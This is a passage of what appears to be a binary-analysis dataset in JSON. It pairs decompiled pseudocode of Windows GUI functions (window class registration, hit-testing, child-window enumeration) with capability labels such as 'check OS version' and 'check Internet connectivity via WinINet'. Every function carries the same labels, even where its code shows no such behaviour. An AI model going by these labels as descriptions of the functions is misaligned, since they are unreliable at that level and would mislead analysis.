        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00452e53)\n\nvoid __fastcall fcn.00452e0c(char param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x452efc;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        if (param_1 != '\\0') {\n            fcn.00450894();\n        }\n        fcn.004508c4();\n        if ((param_1 == '\\0') || (cVar1 = (**(*in_EAX + 0x50))(),  cVar1 == '\\x01')) {\n            (**(*in_EAX + 0x68))();\n        }\n        if ((param_1 == '\\0') || (in_EAX[0x21] == 0)) {\n            fcn.00405584();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x57) == '\\x01')) {\n            fcn.004507b4();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x112) == 0)) {\n            in_EAX[0x44] = *(param_2 + 0x40);\n            in_EAX[0x45] = *(param_2 + 0x44);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x452f03;\n    uStack32 = 0x452efb;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 437
    },
    "00453238": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453238(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uStack64;\n    uint uStack60;\n    int16_t iStack55;\n    int16_t iStack53;\n    uchar auStack28 [12];\n    \n    if (*(param_2 + 0xc) == 0) {\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            iStack55 = *(param_2 + 8);\n            iStack53 = *(param_2 + 8) >> 0x10;\n            cVar1 = fcn.00418498(iStack55, iStack53);\n            if (cVar1 == '\\0') {\n                fcn.004503d4();\n                (**(*in_EAX + 0x44))(uStack64, uStack60);\n                iVar2 = sub.user32.dll_PtInRect(auStack28);\n                if (iVar2 == 0) {\n                    (**(*in_EAX + -0x10))();\n                    return;\n                }\n            }\n            fcn.0040484c();\n            *(param_2 + 0xc) = 0;\n            piVar3 = fcn.0040484c();\n            if ((piVar3 != NULL) && (*(piVar3 + 0x61) != '\\0')) {\n                fcn.00450400();\n                piVar3[0x19] = in_EAX;\n                cVar1 = fcn.00418498();\n                if (cVar1 != '\\0') {\n                    fcn.00418420();\n                    fcn.00450324();\n                }\n                (**(*piVar3 + 0x40))();\n                *(param_2 + 0xc) = 1;\n            }\n            if (*(param_2 + 0xc) == 0) {\n                (**(*in_EAX + -0x10))();\n            }\n        }\n        else {\n            (**(*in_EAX + -0x10))();\n        }\n    }\n    return;\n}\n",
        "token_count": 477
    },
    "00453678": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00453678(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char extraout_DL;\n    \n    piVar1 = fcn.00404a1c();\n    fcn.00420278();\n    if (*(piVar1 + 0x77) != '\\0') {\n        *(piVar1 + 0x77) = 0;\n        fcn.0044e1a0();\n    }\n    fcn.0040700c();\n    fcn.00404650();\n    if (piVar1[0xc] != 0) {\n        fcn.00454464();\n    }\n    if (piVar1[0x6d] != 0) {\n        (**(*piVar1 + 0xb4))();\n    }\n    iVar2 = fcn.004546e8();\n    while (iVar2 != 0) {\n        piVar3 = fcn.004546ac();\n        fcn.004544d0();\n        (**(*piVar3 + -4))();\n        iVar2 = fcn.004546e8();\n    }\n    fcn.00404650();\n    if (piVar1[0x70] != 0) {\n        fcn.0042111c();\n    }\n    fcn.00404650();\n    fcn.0044f7f4();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 332
    },
    "00453758": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00453758(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x1d0) == 0) {\n        return;\n    }\n    puStack28 = 0x45377f;\n    fcn.00404620();\n    uStack32 = 0x45381c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar3 = *(*(in_EAX + 0x1d0) + 8);\n    puStack28 = &stack0xfffffffc;\n    fcn.00419a38();\n    iVar2 = iVar3;\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar1 = fcn.00419898();\n            if ((-1 < *(iVar1 + 0x1d4)) && (*(iVar1 + 0x1d4) < iVar3)) {\n                fcn.0041998c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar2 = fcn.00419898();\n            if (iVar2 != 0) {\n                fcn.00458838();\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x453823;\n    uStack32 = 0x45381b;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 418
    },
    "00453e8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453e8c(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    (**(**(arg_8h + -0xc) + 8))();\n    if (((*(arg_8h + -0x10) != 0) &&\n        (((in_AL == '\\0' || (*(*(arg_8h + -0x10) + 0x57) != '\\0')) ||\n         (((*(*(arg_8h + -0x10) + 0x1c) & 0x10) != 0 && ((*(*(arg_8h + -0x10) + 0x51) & 4) == 0)))))) &&\n       (in_AL == *(*(arg_8h + -0x10) + 0x5b))) {\n        fcn.00419740();\n    }\n    var_8h = fcn.004546e8();\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = fcn.004546ac();\n            if (((in_AL == *(iVar2 + 0x5b)) &&\n                (((((in_AL == '\\0' || (*(iVar2 + 0x57) != '\\0')) || (*0x454014 == (*0x454014 & *(iVar2 + 0x50)))) ||\n                  (((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)))) &&\n                 ((cVar1 = fcn.004047dc(),  cVar1 == '\\0' || ((*(iVar2 + 0x1c) & 0x10) == 0)))))) &&\n               (iVar2 != *(arg_8h + -0x10))) {\n                for (iVar2 = 0; iVar2 < *(*(arg_8h + -0xc) + 8); iVar2 = iVar2 + 1) {\n                    arg_8h_00 = arg_8h;\n                    fcn.00419898();\n                    cVar1 = fcn.00453d14(arg_8h_00);\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00419914();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    var_8h = *(*(arg_8h + -0xc) + 8);\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = arg_8h;\n            fcn.00419898();\n            fcn.00453e44(iVar2);\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 687
    },
    "00454018": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00454018(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.004546e8();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.004546ac();\n            if (*(iVar2 + 0x5b) != '\\0') {\n                return 1;\n            }\n            iVar2 = fcn.004546ac();\n            if (*0x454068 != *(iVar2 + 0x61)) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 165
    },
    "0045406c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045406c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x77) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (in_EAX[0x6c] != 0)) {\n        (**(*in_EAX[0x6c] + 0x2c))();\n    }\n    uStack32 = 0x4540b6;\n    cVar1 = fcn.00454018(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x90))();\n        fcn.00404620();\n        uStack32 = 0x45414b;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        fcn.00453e8c(&stack0xfffffffc);\n        fcn.00453e8c(&stack0xfffffffc);\n        fcn.00453e8c(&stack0xfffffffc);\n        fcn.00453e8c(&stack0xfffffffc);\n        fcn.00453e8c(&stack0xfffffffc);\n        fcn.00453e8c(&stack0xfffffffc);\n        fcn.00453e8c(&stack0xfffffffc);\n        fcn.0040484c();\n        *in_FS_OFFSET = uStack36;\n        uStack32 = 0x45414a;\n        fcn.00404650();\n        return;\n    }\n    if (*(in_EAX + 0x1da) != '\\0') {\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 422
    },
    "00454170": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454170(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack32 = 0x454184;\n    cVar1 = fcn.00458904();\n    if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 8) == 0)) {\n        if (*(in_EAX + 100) == 0) {\n            puStack32 = 0x4541b0;\n            fcn.00454204();\n            uStack36 = 0x4541f7;\n            uStack40 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd8;\n            puStack32 = &stack0xfffffffc;\n            (**(*in_EAX + 0x44))();\n            (**(*in_EAX + 0x94))();\n            *in_FS_OFFSET = uStack40;\n            puStack32 = 0x4541fe;\n            *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n            uStack36 = 0x4541f6;\n            fcn.0045420c();\n            return;\n        }\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) | 0x10;\n    }\n    return;\n}\n",
        "token_count": 339
    },
    "0045420c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045420c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 400) = *(in_EAX + 400) + -1;\n    if ((*(in_EAX + 400) == 0) && ((*(in_EAX + 0x54) & 0x10) != 0)) {\n        fcn.0045422c();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00454708": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454708(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.004546e8();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.004546ac();\n            (**(iVar2 + 0x38))();\n            if (*(param_2 + 0xc) != 0) {\n                return;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "00454934": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00454934(void)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint *arg_ch;\n    uint uStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint lpWndClass;\n    code *var_b0h;\n    uint var_8ch;\n    uint var_85h;\n    int32_t var_70h;\n    uint var_68h;\n    code *var_64h;\n    uint hInstance;\n    uint *var_44h;\n    uint lpClassName;\n    \n    puStack208 = &stack0xfffffffc;\n    uStack212 = 0x454af5;\n    uStack216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack216;\n    (**(*in_EAX + 0x9c))();\n    if ((var_70h == 0) && ((var_85h & 0x40) != 0)) {\n        if ((in_EAX[1] != 0) && ((*(in_EAX[1] + 0x1c) & 2) != 0)) {\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\n                var_70h = fcn.004585f8();\n                goto code_r0x004549e0;\n            }\n        }\n        var_bch = in_EAX[2];\n        var_b8h._0_1_ = 0xb;\n        arg_ch = &var_bch;\n        uVar5 = 0;\n        fcn.00407550();\n        fcn.0040db38(uVar5, arg_ch);\n        fcn.00404ec4();\n    }\ncode_r0x004549e0:\n    in_EAX[0x6a] = var_64h;\n    iVar3 = sub.user32.dll_GetClassInfoA(hInstance, &lpClassName, &lpWndClass);\n    if ((iVar3 == 0) || (var_b0h != fcn.0044d1b0)) {\n        if (iVar3 != 0) {\n            sub.user32.dll_UnregisterClassA(&lpClassName, hInstance);\n        }\n        var_64h = fcn.0044d1b0;\n        var_44h = &lpClassName;\n        iVar2 = sub.user32.dll_RegisterClassA(&var_68h);\n        if (iVar2 == 0) {\n            fcn.0040f26c();\n        }\n    }\n    *0x492650 = in_EAX;\n    (**(*in_EAX + 0xa0))();\n    if (in_EAX[0x6d] == 0) {\n        fcn.0040f26c();\n    }\n    uVar4 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff0);\n    if ((uVar4 & 0x40000000) != 0) {\n        iVar3 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff4);\n        if (iVar3 == 0) {\n            sub.user32.dll_SetWindowLongA(in_EAX[0x6d], 0xfffffff4, in_EAX[0x6d]);\n        }\n    }\n    fcn.0040ab08();\n    in_EAX[0x19] = 0;\n    fcn.00458910();\n    uVar5 = 1;\n    fcn.0042473c();\n    fcn.00451b4c(uVar5);\n    if (*(in_EAX + 0x17) != '\\0') {\n        fcn.0040484c();\n    }\n    *in_FS_OFFSET = uVar5;\n    fcn.00405530(0x454afc);\n    return;\n}\n",
        "token_count": 902
    },
    "00454be4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00454be4(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    if ((*(*(arg_8h + -4) + 0x20) == 0) || (cVar1 = fcn.00454bd0(),  cVar1 == '\\0')) {\n        iVar3 = *(*(arg_8h + -8) + 0x1cc);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.00419898();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x454cc0 != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = *(*(arg_8h + -8) + 0x1d0);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.00419898();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x454cc0 != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 380
    },
    "00454ee8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00454ee8(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *arg_8h;\n    uStack16 = arg_8h[1];\n    uStack12 = arg_8h[2];\n    uStack8 = arg_8h[3];\n    if (*(in_EAX + 0x232) != 0) {\n        (**(in_EAX + 0x230))(&var_10h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00454f7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454f7c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    if (in_EAX[0x6d] != 0) {\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                piVar1 = fcn.00419898();\n                (**(*piVar1 + 0xb0))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iStack20 = in_EAX[0x6d];\n        uStack16 = (*(in_EAX + 0x55) & 0x20) != 0;\n        sub.user32.dll_EnumChildWindows(iStack20, fcn.00454f38, &iStack20);\n        (**(*in_EAX + 0xb8))();\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "00454ff0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454ff0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        fcn.00451b4c(0);\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "00455094": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00455094(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    if ((((*(in_EAX + 0x57) == '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x55) & 8) != 0)))) &&\n        (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 0x55) & 8) != 0 || ((*(in_EAX + 0x51) & 4) != 0)))))) ||\n       (((*(in_EAX + 0x15) & 8) != 0 || ((*(in_EAX + 7) & 8) != 0)))) {\n        cVar1 = '\\0';\n    }\n    else {\n        cVar1 = '\\x01';\n    }\n    if (cVar1 != '\\0') {\n        if (in_EAX[0x6d] == 0) {\n            puStack28 = 0x45510e;\n            (**(*in_EAX + 0x98))();\n        }\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                puStack28 = 0x455136;\n                fcn.00419898();\n                puStack28 = 0x45513b;\n                fcn.00455094();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    if ((in_EAX[0x6d] != 0) && (*(in_EAX + 0x1da) != cVar1)) {\n        *(in_EAX + 0x1da) = cVar1;\n        uStack32 = 0x455190;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        uVar3 = 0;\n        puStack28 = &stack0xfffffffc;\n        fcn.00451b4c(0);\n        *in_FS_OFFSET = uVar3;\n    }\n    return;\n}\n",
        "token_count": 548
    },
    "004551b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004551b8(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = in_EAX;\n    do {\n        iVar1 = *(iVar3 + 0x30);\n        if (iVar1 == 0) {\n            if ((*(in_EAX + 0x1c) & 8) == 0) {\n                cVar2 = fcn.004047dc();\n                if ((cVar2 != '\\0') || (*(iVar3 + 0x1c4) != 0)) {\n                    fcn.00455094();\n                }\n            }\n            return;\n        }\n        iVar3 = iVar1;\n    } while (*(iVar1 + 0x1da) != '\\0');\n    *(in_EAX + 0x1da) = 0;\n    return;\n}\n",
        "token_count": 198
    },
    "00455208": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455208(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_4h;\n    \n    if ((in_EAX[0xc] == 0) && (param_2 != in_EAX[0x71])) {\n        if ((in_EAX[0x6d] == 0) || ((in_EAX[0x71] == 0 || (param_2 == 0)))) {\n            fcn.00459998();\n            uVar1 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            (**(*in_EAX + 0xb0))();\n            in_EAX[0x71] = param_2;\n            fcn.004551b8();\n            *in_FS_OFFSET = uVar1;\n            fcn.00459998();\n            return;\n        }\n        in_EAX[0x71] = param_2;\n        sub.user32.dll_SetParent();\n        if ((4 < **0x494958) && (**0x494d14 == 2)) {\n            fcn.00451b4c(0);\n        }\n        fcn.004551b8();\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "00455364": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00455364(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    uint lprc;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00418420();\n    *(arg_8h + -0xc) = var_ch;\n    *(arg_8h + -8) = var_8h;\n    (**(*in_EAX + 0x44))(*(arg_8h + -0xc), *(arg_8h + -8));\n    iVar2 = sub.user32.dll_PtInRect(&lprc);\n    if (iVar2 == 0) {\n        bVar3 = false;\n    }\n    else if (((*(in_EAX + 7) & 0x10) == 0) || ((*(in_EAX + 0x57) == '\\0' && ((*(in_EAX + 0x51) & 4) != 0)))) {\n        if (*(in_EAX + 0x57) != '\\0') {\n            cVar1 = (**(*in_EAX + 0x50))();\n            if ((cVar1 != '\\0') || (*(arg_8h + -0xd) != '\\0')) {\n                var_4h = CONCAT22(*(arg_8h + -8), *(arg_8h + -0xc));\n                iVar2 = fcn.00451b4c(var_4h);\n                bVar3 = iVar2 != 0;\n                goto code_r0x00455420;\n            }\n        }\n        bVar3 = false;\n    }\n    else {\n        bVar3 = true;\n    }\ncode_r0x00455420:\n    if (bVar3) {\n        *(arg_8h + -0x14) = in_EAX;\n    }\n    return;\n}\n",
        "token_count": 427
    },
    "00455430": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00455430(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint arg_ch_00;\n    uchar *puVar3;\n    uint arg_8h_00;\n    int32_t var_14h;\n    uint var_dh;\n    uint var_4h;\n    \n    var_14h = 0;\n    if (((arg_ch != '\\0') && (*(in_EAX + 0x1d0) != 0)) && (iVar2 = *(*(in_EAX + 0x1d0) + 8) + -1,  -1 < iVar2)) {\n        do {\n            if (arg_8h != '\\0') {\n                arg_ch_00 = 1;\n                arg_8h_00 = 1;\n                fcn.00419898();\n                var_14h = fcn.00455430(arg_8h_00, arg_ch_00);\n            }\n            if (var_14h == 0) {\n                puVar3 = &stack0xfffffffc;\n                fcn.00419898();\n                cVar1 = fcn.00455364(puVar3);\n                if (cVar1 != '\\0') break;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (((*(in_EAX + 0x1cc) != 0) && (var_14h == 0)) && (iVar2 = *(*(in_EAX + 0x1cc) + 8) + -1,  -1 < iVar2)) {\n        do {\n            puVar3 = &stack0xfffffffc;\n            fcn.00419898();\n            cVar1 = fcn.00455364(puVar3);\n            if (cVar1 != '\\0') {\n                return 0;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return var_14h;\n}\n",
        "token_count": 458
    },
    "00455640": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00455640(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.004585f8();\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar1 == iVar2) {\n        if ((*0x492710 == 0) || (iVar1 = *0x492710,  in_EAX != *(*0x492710 + 0x30))) {\n            iVar1 = 0;\n        }\n    }\n    else {\n        iVar1 = fcn.00455430(0, 0);\n    }\n    if (iVar1 != 0) {\n        uVar3 = fcn.00451b4c(*(param_2 + 8) - *(iVar1 + 0x40) & 0xffffU | *(param_2 + 10) - *(iVar1 + 0x44) << 0x10);\n        *(param_2 + 0xc) = uVar3;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 253
    },
    "00455c14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
